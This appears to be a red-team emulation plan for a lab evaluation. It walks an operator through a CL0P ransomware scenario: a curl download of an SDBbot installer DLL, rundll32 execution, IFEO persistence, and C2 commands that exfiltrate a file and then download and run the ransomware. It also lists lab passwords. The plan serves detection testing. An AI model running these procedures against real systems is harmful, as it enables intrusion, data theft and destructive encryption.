# CL0P Scenario Overview

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Disconnect from RDP
* :red_circle: - Sign out of RDP
* :camera: - take a screenshot
* :clock2: - Record timestamp
* :loud_sound: - Noise activity
---

## Step 0 - Red Setup

### :biohazard: Procedures

* Initiate an RDP session to the Kali attack host `corsair (223.246.0.70)`:

    | IP | Username | Password |
    | -------- | -------- | -------- |
    | 223.246.0.70 | op1 | Subpar-Parabola |

* In a new terminal window start the evalsC2server, ensuring the following
handlers are enabled:

  * Simple File Server
  * SDBbot

    ```bash
    cd cl0p/Resources/control_server
    sudo go build -o controlServer main.go
    sudo ./controlServer -c config/cl0p.yml
    ```

    | Password |
    | -------- |
    | Subpar-Parabola |

* Right-click within the terminal window and click "Split Terminal
Horizontally". Within the new terminal, change directory to the location of the
evalsC2client.py and **use this terminal for tasking implants**.

  ```bash
  cd cl0p/Resources/control_server
  ```

* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`

## Step 0 - Range Setup

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate an RDP
session to the Windows victim workstation `diagonalley (10.55.4.21)` as
`encryptpotter.net\griphook`:

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | diagonalley.encryptpotter.net | encryptpotter.net\griphook | Feral-Studs |

* Search for Command Prompt and execute the following command.

```cmd
curl -o C:\Users\griphook\AppData\Roaming\IFInstaller.dll  http://curse-breaker.org/files/installer.dll
```

* Close the command prompt window.

## Step 1 - Persistence (Evaluation Step 5)

### :microphone: Voice Track

> [!Note]
> This plan starts after initial compromise, where a victim has already
downloaded the payload.

The victim executes the downloaded SDBbot Installer
(`C:\Users\griphook\AppData\Roaming\IFInstaller.dll`) using `rundll32.exe`.

The SDBbot Installer contains an embedded RAT payload and, on execution, writes
shellcode and the embedded payload as a binary blob to the registry at
`HKLM\SOFTWARE\Microsoft\skw`. Then, the installer establishes persistence
using image file execution options injection:

* The SDBbot Installer saves the SDBbot Loader DLL to `C:\Windows\temp\tmp8AB2.tmp`
and creates a symbolic link `C:\Windows\System32\msverload.dll` linking to the
Loader DLL
* The SDBbot Installer adds `msverload.dll` to the VerifierDlls value for
`winlogon.exe`

### :biohazard: Procedures

* In the RDP session to the Windows victim workstation `diagonalley (10.55.4.21)`
as `encryptpotter.net\griphook`, search for Command Prompt and right-click to
Run as Administrator.

* In the Admin Command Prompt, execute the SDBbot Installer using `rundll32`:

    ```bat
    rundll32.exe C:\Users\griphook\AppData\Roaming\IFInstaller.dll,install
    ```

* :camera: Confirm and screenshot that the payload was executed in Command Prompt.

### :loud_sound: Noise
The following noise activity is executed:
* User will execute rundll32.exe to load scripts with msedge
    * cmd.exe executed `rundll32  url.dll,FileProtocolHandler https://www.google.com & taskkill /F /IM \"msedge.exe\" /T`
* User will create text files using Notepad
    * notepad.exe creates C:\\Users\\Public\\hidden.txt" & "C:\\Users\\Public\\original.txt
* User will embed a text file within another text file
    * cmd.exe executed `copy /b C:\\Users\\Public\\hidden.txt C:\\Users\\Public\\original.txt`
* User will modify the IFEO registry for msedge
    * `reg add \HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msedge.exe\" /v Debugger /t REG_SZ /d \"C:\\ Program Files\\Mozilla Firefox\\firefox.exe\""`

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| IFInstaller.dll is executed via rundll32.exe | - | T1218.011 System Binary Proxy Execution: Rundll32 | - |
| IFInstaller.dll contains an embedded PE file | [Load and decrypt embedded shellcode](../Resources/sdbbot/src/installer/main.cpp#L97-L110) | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) |
| SDBbot Installer stores the loader shellcode and embedded PE file in HKLM\SOFTWARE\Microsoft\skw | [register_shellcode_transacted](../Resources/sdbbot/src/installer/shellcode.cpp#L60-L97) | T1112 Modify Registry | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot Installer installs persistence via image file executions options VerifierDLL | [verifier.cpp](../Resources/sdbbot/src/installer/verifier.cpp) | T1546.012 Event Triggered Execution: Image File Execution Options Injection | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) |

## Step 2 - Command and Control (Evaluation Step 6)

### :microphone: Voice Track

Eventually `encryptpotter.net\griphook` logs back in to `diagonalley (10.55.4.21)`,
executing the image file execution options persistence mechanism.

The SDBbot Loader component reads the binary blob stored in the registry and
executes the shellcode. The shellcode will load and execute the SDBbot RAT
payload in memory. The SDBbot RAT establishes C2 communication over TCP port
443 and sends discovery output (domain name, computer name, country code, OS
version, user privileges, whether proxy is configured).

### :biohazard: Procedures

* Return to your RDP session to `diagonalley (10.55.4.21)` as `encryptpotter.net\griphook`

* Sign out of the RDP session and sign back in to `diagonalley (10.55.4.21)` as `encryptpotter.net\griphook`

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | diagonalley.encryptpotter.net | encryptpotter.net\griphook | Feral-Studs |

* On the Desktop, open Inventory_gdlRyr.xls (opens in LibreOffice Calc)

* :arrow_right: Return to the Kali attack host `corsair (223.246.0.70)`

* :camera: Confirm and screenshot C2 registration of the SDBbot RAT

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| Operating system loads SDBbot Loader into `winlogon.exe` |  | T1546.012 Event Triggered Execution: Image File Execution Options Injection | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) |
| SDBbot Loader reflectively loads the SDBbot RAT |  | T1620 Reflective Code Loading | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) |
| SDBbot RAT uses Windows APIs | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L11) | T1106 Native API | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers current process integrity via OpenProcessToken, GetCurrentProcess, and GetTokenInformation | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L81) | T1057 Process Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers domain name via gethostname and getaddrinfo | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L24) | T1082 System Information Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers computer name via GetComputerName | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L51) | T1082 System Information Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers username via GetUserNameA | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L137) | T1033 System Owner/User Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers country code via GetUserGeoID and GetGeoInfoW | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L11) | T1082 System Information Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT discovers the Windows version via rtlGetVersion | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L63) | T1082 System Information Discovery | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |
| SDBbot RAT connects to the C2 server over TCP port 443 | [comms.cpp](../Resources/sdbbot/src/rat/comms.cpp#L85) | T1095 Non-Application Layer Protocol | [Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[IBM X-Force - 2020](https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/) |

## Step 3 - Discovery and Exfiltration (Evaluation Step 7)

### :microphone: Voice Track

The attacker will then use SDBbot to discover and exfiltrate files of interest
from the workstation.

### :biohazard: Procedures

* Task the SDBbot RAT to enumerate a user directory before exfiltrating files

    ```bash
    ./evalsC2client.py --set-task 0x0000000F '{"id":"execute", "arg":"dir C:\\users\\"}'
    ```

* Task the SDBbot RAT to exfiltrate files

    ```bash
    ./evalsC2client.py --set-task 0x0000000F '{"id":"read", "arg":"C:\\Users\\griphook\\Desktop\\Findings_reZGaJ.doc"}'
    ```

* :camera: Confirm and screenshot the successful file download from the C2 server output.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| SDBbot RAT executes dir | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L218) | T1083 File and Directory Discovery | - |
| SDBbot RAT exfiltrates files | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L272) | T1041 Exfiltration Over C2 Channel | [Cybereason - 2020](https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware) |

---

### :loud_sound: Noise Step

* :exclamation: Notify your Threat Hunter that you are starting execution of the
Detections manual noise step

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, watch the RDP
session to the Windows victim workstation `vault713 (10.55.3.100)` as
`encryptpotter.net\ranrok`. If GHOSTS is currently performing actions or in the
middle of a timeline, wait for it to finish. Then click into the RDP session and
you'll have a brief window to do the following.

* search for PowerShell and right-click to Run as Administrator

* Execute the following command to install 7zip to computers in the domain

```cmd
Invoke-Command -ComputerName diagonalley,gobbledgook,vault713,azkaban,hangleton -ScriptBlock { choco install 7zip -y }
```

* :arrow_right: Minimize your RDP then From the Windows jumpbox
`spitfire (223.246.0.90)`, initiate an RDP session to the Windows victim
workstation `diagonalley (10.55.4.21)` as `encryptpotter.net\griphook` if one
does not already exist.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | diagonalley.encryptpotter.net | encryptpotter.net\griphook | Feral-Studs |

* Open File Explorer then browse to Documents and create a new folder named `xfer`

* Drag all files in Documents into `xfer`

* Right-click the xfer folder > Show More Options > 7-ZIP > Add to Archive...

  * Use `leakycauldron` as the zip password

* Delete the original `xfer` folder

* Under �This PC�, open the share in a **new** File Explorer window and click
into the mounted share `Z:`

* Drag the xfer.zip to the root of the network share

* Search for and open `WordPad`. Do not close the application.

* :red_circle: Disconnect from the RDP to `diagonalley (10.55.4.21)`

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, watch the RDP
session to the Windows victim workstation `gobbledgook (10.55.4.22)`. If GHOSTS is
currently performing actions or in the middle of a timeline, wait for it to finish.
Then click into the RDP session and you'll have a brief window to do the following.

* In a new File Explorer window, click "This PC" from the left menu

* Click on the mapped network drive `Z:`

* Copy the xfer.zip to Downloads

* Right-click the xfer folder > Show More Options > 7-ZIP > Extract Here
then enter `leakycauldron` for the password

* Click out of the RDP window to `gobbledgook (10.55.4.22)` but leave it open and
running so that GHOSTS can continue executing.

---

## Step 4 - Defense Evasion and Impact (Evaluation Step 8)

### :microphone: Voice Track

The attacker will then use SDBbot to ingress and execute the CL0P ransomware on
`diagonalley (10.55.4.21)`. On execution, CL0P will perform the following actions:

* Discover the keyboard layout to check the language and retrieve the font used
by the system
* Delete shadow copies and resize shadow storage
* Disable boot recovery options
* Stop various services
* Stop various processes
* Enumerate logical drives and files
* Suppress error dialogues and encrypt files using AES, appending the `.C_I0p`
extension to encrypted files
* Leave ransom notes in affected folders
* Clear Windows Event Logs
* Delete itself on completion

### :loud_sound: Noise
The following noise activity is executed:
* User will execute commands
   * `cmd.exe executed systeminfo | findstr /B /C:'System Locale'`
   * `cmd.exe executed netsh advfirewall set allprofiles state off`
* User will execute powershell commands
   * `Get-WmiObject -Class Win32_Service | Where-Object {{}$_.State -eq
      \"Running\"{}} | Format-Table`
   * `Stop-Service -Name Bluetooth{TAB}`
   * `Stop-Service -Name BTAGService`
   * `Stop-Service -Name OneSync{TAB}`
   * `Stop-Service -Name XblGameSave`
   * `Stop-Service -Name WbioSrvc`
   * `Get-WinSystemLocale`

### :biohazard: Procedures

* From the Kali attack host `corsair (223.246.0.70)`, task the SDBbot RAT to ingress
the CL0P executable

    ```bash
    ./evalsC2client.py --set-task 0x0000000F '{"id":"download", "payload":"main.exe", "arg":"C:\\Windows\\System32\\SysMonitor.exe"}'
    ```

* Task the SDBbot RAT to execute CL0P

    ```bash
    ./evalsC2client.py --set-task 0x0000000F '{"id":"execute", "arg":"C:\\Windows\\System32\\SysMonitor.exe"}'
    ```

* Allow 5-10 minutes for CL0P to finish running.

* :camera: Screenshot the result of CL0P execution from the C2 server output.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| SDBbot RAT ingresses CL0P executable | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L177) | T1105 Ingress Tool Transfer | [Palo Alto - 2021](https://unit42.paloaltonetworks.com/clop-ransomware/) |
| SDBbot RAT executes CL0P executable | [core.cpp](../Resources/sdbbot/src/rat/core.cpp#L218) | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [Palo Alto - 2021](https://unit42.paloaltonetworks.com/clop-ransomware/)<br>[Proofpoint - 2019](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)<br>[Cybereason - 2020](https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware) |
| CL0P checks keyboard layout via GetKeyboardLayout and GetTextCharset | [guardrails.cpp](../Resources/Cl0p/src/guardrails.cpp#L48) | T1614.001: System Location Discovery: System Language Discovery | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/) |
| CL0P executes commands via cmd.exe /c | [core.cpp](../Resources/Cl0p/src/core.cpp#L39) | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [Cybereason - 2020](https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware) |
| CL0P deletes shadow copies and resizes shadow storage | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L195) | T1490 Inhibit System Recovery | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/)<br>[Sectrio - 2023](https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/) |
| CL0P disables boot recovery options | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L199) | T1490 Inhibit System Recovery | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/) |
| CL0P stops services | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L203) | T1489 Service Stop | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/) |
| CL0P stops processes via OpenProcess and TerminateProcess | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L312) | T1489 Service Stop | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/) |
| CL0P suppresses error dialogues via SetErrorMode | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L345) | T1562.006 Impair Defenses: Indicator Blocking | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/) |
| CL0P encrypts files using AES, appending the `.C_I0p` extension to encrypted files | [encryption.cpp](../Resources/Cl0p/src/encryption.cpp#L74) | T1486 Data Encrypted for Impact | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/)<br>[Cybereason - 2020](https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware) |
| CL0P leaves ransom notes to affected folders | [encryption.cpp](../Resources/Cl0p/src/encryption.cpp#L107) | T1491.001 Defacement: Internal Defacement | [Cybereason - 2020](https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware)<br>[McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/)<br>[Palo Alto - 2021](https://unit42.paloaltonetworks.com/clop-ransomware/)<br>[Sectrio - 2023](https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/) |
| CL0P clears Windows Event Logs | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L207) | T1070.001 Indicator Removal: Clear Windows Event Logs | [Sectrio - 2023](https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/)<br> [Trend Micro - 2022](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-clop) |
| CL0P deletes itself | [defense.cpp](../Resources/Cl0p/src/defense.cpp#L349) | T1070.004 Indicator Removal: File Deletion | [McAfee - 2019](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/)<br>[Sectrio - 2023](https://sectrio.com/deconstructing-cl0p-ransomware-moveit-2023-breach/) |

---

## :end: End of Execution